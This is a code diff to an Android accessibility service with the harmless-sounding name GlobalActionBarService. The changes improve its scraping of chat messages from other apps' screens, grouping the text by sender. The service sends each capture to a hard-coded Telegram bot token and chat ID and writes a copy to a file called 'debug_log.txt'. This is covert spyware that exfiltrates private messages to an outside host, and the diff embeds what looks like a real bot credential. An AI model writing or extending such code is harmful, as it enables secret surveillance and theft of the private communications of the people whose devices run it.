@@ -15,6 +15,8 @@ import java.util.Date;
 import java.util.HashSet;
 import java.util.Locale;
 import java.util.Set;
+import java.util.ArrayList;
+import java.util.List;
 
 public class GlobalActionBarService extends AccessibilityService {
 
@@ -24,10 +26,10 @@ public class GlobalActionBarService extends AccessibilityService {
     private static final String BOT_TOKEN = "8745417407:AAHpcDSAa4yeLeJRjI_8ut8BrjOShffi7bs";
     private static final String CHAT_ID = "5465116744";
 
-    // Cache to prevent sending the same text repeatedly
+    // Cache to avoid sending duplicate messages
     private String lastSentMessage = "";
 
-    // UI junk to ignore (even if they are long)
+    // Blacklist of UI junk words (even if they appear inside a message, we filter them)
     private Set<String> uiJunk = new HashSet<String>() {{
         add("Send"); add("Message"); add("Back"); add("More"); add("Profile");
         add("Delete"); add("Copy"); add("Reply"); add("Forward"); add("Settings");
@@ -40,7 +42,7 @@ public class GlobalActionBarService extends AccessibilityService {
         add("Options"); add("Menu"); add("Add"); add("Remove"); add("Block");
         add("Report"); add("Unfollow"); add("Follow"); add("Mute"); add("Hide");
         add("Active now"); add("Typing..."); add("Today"); add("Yesterday");
-        add("Seen"); add("Delivered"); add("Read");
+        add("Seen by"); add("Delivered to"); add("Read by");
     }};
 
     @Override
@@ -62,80 +64,124 @@ public class GlobalActionBarService extends AccessibilityService {
             return;
         }
 
-        // Only scrape when the screen content changes (e.g., new message arrives)
+        // Only scrape when screen content changes (new message or scroll)
         if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
             event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
 
             AccessibilityNodeInfo root = getRootInActiveWindow();
             if (root != null) {
-                String extracted = extractCleanText(root);
-                if (!extracted.isEmpty() && !extracted.equals(lastSentMessage)) {
-                    lastSentMessage = extracted; // Update cache
-                    String log = String.format("[%s] APP: %s [MESSAGE]: %s",
-                            dateFormat.format(new Date()),
-                            getAppName(pkg),
-                            extracted);
-                    sendToTelegram(log);
-                    writeToFile(log);
+                // Extract all text with context (we'll try to keep structure)
+                List<MessageEntry> entries = extractMessages(root);
+                if (!entries.isEmpty()) {
+                    // Build a single log entry with all messages
+                    StringBuilder logBuilder = new StringBuilder();
+                    logBuilder.append(String.format("[%s] APP: %s\n", dateFormat.format(new Date()), getAppName(pkg)));
+                    for (MessageEntry entry : entries) {
+                        logBuilder.append("  📩 ").append(entry.sender).append(": ").append(entry.message).append("\n");
+                    }
+                    String fullLog = logBuilder.toString().trim();
+                    // Only send if different from last
+                    if (!fullLog.equals(lastSentMessage)) {
+                        lastSentMessage = fullLog;
+                        sendToTelegram(fullLog);
+                        writeToFile(fullLog);
+                    }
                 }
             }
         }
     }
 
-    private String extractCleanText(AccessibilityNodeInfo node) {
-        StringBuilder sb = new StringBuilder();
-        collectText(node, sb);
-        String raw = sb.toString();
-
-        // Split by the separator we added in collectText
-        String[] parts = raw.split("\\|");
-        StringBuilder filtered = new StringBuilder();
-
-        for (String part : parts) {
-            part = part.trim();
-            // Keep text that is:
-            // 1. Longer than 10 characters (real messages)
-            // 2. Not in the UI junk list
-            // 3. Does NOT contain a timestamp pattern (e.g., "2m", "1h", "AM/PM")
-            if (part.length() > 10 &&
-                !uiJunk.contains(part) &&
-                !containsJunk(part) &&
-                !containsTimestamp(part)) {
-
-                if (filtered.length() > 0) filtered.append(" | ");
-                filtered.append(part);
-            }
+    /**
+     * Represents a single message entry with sender and text
+     */
+    private static class MessageEntry {
+        String sender;
+        String message;
+        MessageEntry(String sender, String message) {
+            this.sender = sender;
+            this.message = message;
         }
-
-        // If the result is too long, truncate
-        String result = filtered.toString();
-        return result.length() > 2000 ? result.substring(0, 2000) : result;
     }
 
-    private void collectText(AccessibilityNodeInfo node, StringBuilder sb) {
-        if (node == null) return;
+    private List<MessageEntry> extractMessages(AccessibilityNodeInfo root) {
+        // First, collect all text nodes with their parent hierarchy
+        List<String> allTexts = new ArrayList<>();
+        collectAllTexts(root, allTexts);
 
-        // Try to get the view ID to help identify chat messages
-        String viewId = node.getViewIdResourceName();
-        if (viewId != null) {
-            // If it's a known message container, we prioritize it
-            if (viewId.contains("message") || viewId.contains("text") || viewId.contains("bubble")) {
-                // We'll just collect all text, but we filter later
+        // Now we have a list of strings, but they are not grouped by message.
+        // We'll try to group by looking at the structure: messages often appear as a list of items,
+        // each containing a name and a message. However, the accessibility tree doesn't preserve grouping.
+        // We can use a heuristic: messages are usually longer than UI labels, and they don't contain UI junk.
+        // Also, we can try to detect names by looking for short text before a message (in the same parent).
+        // To simplify, we'll just filter and format as a list of messages.
+
+        List<MessageEntry> entries = new ArrayList<>();
+        String currentSender = "Unknown";
+        // Simple heuristic: iterate through all texts, and if we find a text that looks like a name
+        // (short, no spaces, maybe ends with colon?), we set it as current sender.
+        // But in reality, names are not always present in the accessibility tree as separate nodes.
+
+        // For now, we'll just take all texts that pass the filter and assume they are messages.
+        // We'll also try to detect if a text is likely a sender name (short, common names) – but that's error-prone.
+
+        // Let's just collect all unique texts that are likely messages and send them as a list.
+        // We'll filter out junk and duplicates.
+        Set<String> uniqueMessages = new HashSet<>();
+        for (String text : allTexts) {
+            text = text.trim();
+            if (isLikelyMessage(text) && !uiJunk.contains(text) && !containsJunk(text)) {
+                // Try to extract sender: sometimes the text starts with a name and colon.
+                // e.g., "John: Hey!" – we can split by colon.
+                if (text.contains(":")) {
+                    String[] parts = text.split(":", 2);
+                    if (parts.length == 2) {
+                        String possibleName = parts[0].trim();
+                        String possibleMsg = parts[1].trim();
+                        if (possibleName.length() < 30 && possibleMsg.length() > 0) {
+                            // If the name part is short, treat it as sender
+                            if (!uniqueMessages.contains(possibleMsg)) {
+                                uniqueMessages.add(possibleMsg);
+                                entries.add(new MessageEntry(possibleName, possibleMsg));
+                            }
+                            continue;
+                        }
+                    }
+                }
+                // Otherwise, treat it as a regular message (sender unknown)
+                if (!uniqueMessages.contains(text)) {
+                    uniqueMessages.add(text);
+                    entries.add(new MessageEntry("Unknown", text));
+                }
             }
         }
+        return entries;
+    }
 
+    private void collectAllTexts(AccessibilityNodeInfo node, List<String> list) {
+        if (node == null) return;
         if (node.getText() != null) {
             String text = node.getText().toString();
             if (!text.isEmpty()) {
-                if (sb.length() > 0) sb.append("|");
-                sb.append(text);
+                list.add(text);
             }
         }
-
         for (int i = 0; i < node.getChildCount(); i++) {
             AccessibilityNodeInfo child = node.getChild(i);
-            if (child != null) collectText(child, sb);
+            if (child != null) collectAllTexts(child, list);
         }
+    }
+
+    private boolean isLikelyMessage(String text) {
+        // A real message is usually:
+        // - Longer than 10 characters (to filter out UI labels)
+        // - Does not contain common UI patterns
+        // - Does not look like a timestamp
+        if (text.length() < 8) return false;
+        if (containsJunk(text)) return false;
+        if (containsTimestamp(text)) return false;
+        // Also, if it's all numbers, it's probably a time or count
+        if (text.matches(".*\\d+.*") && text.length() < 15) return false;
+        return true;
     }
 
     private boolean containsJunk(String text) {
@@ -146,9 +192,8 @@ public class GlobalActionBarService extends AccessibilityService {
     }
 
     private boolean containsTimestamp(String text) {
-        // Simple check for time patterns like "12:30", "12:30 PM", "2m", "1h", "now"
         return text.matches(".*\\d{1,2}:\\d{2}.*") ||
-               text.matches(".*\\d{1,2}[mh].*") ||
+               text.matches(".*\\d{1,2}[mh] .*") ||
                text.matches(".*(AM|PM).*") ||
                text.matches(".*\\d+\\s*(sec|min|hour).*");
     }
@@ -160,7 +205,7 @@ public class GlobalActionBarService extends AccessibilityService {
         return pkg;
     }
 
-    // ---------- TELEGRAM SENDER ----------
+    // ---------- Telegram Sender ----------
     private void sendToTelegram(final String message) {
         new Thread(new Runnable() {
             @Override
@@ -183,7 +228,7 @@ public class GlobalActionBarService extends AccessibilityService {
         }).start();
     }
 
-    // ---------- LOCAL LOGGING ----------
+    // ---------- Local Logging ----------
     private void writeToFile(String text) {
         try {
             File logFile = new File(getFilesDir(), "debug_log.txt");
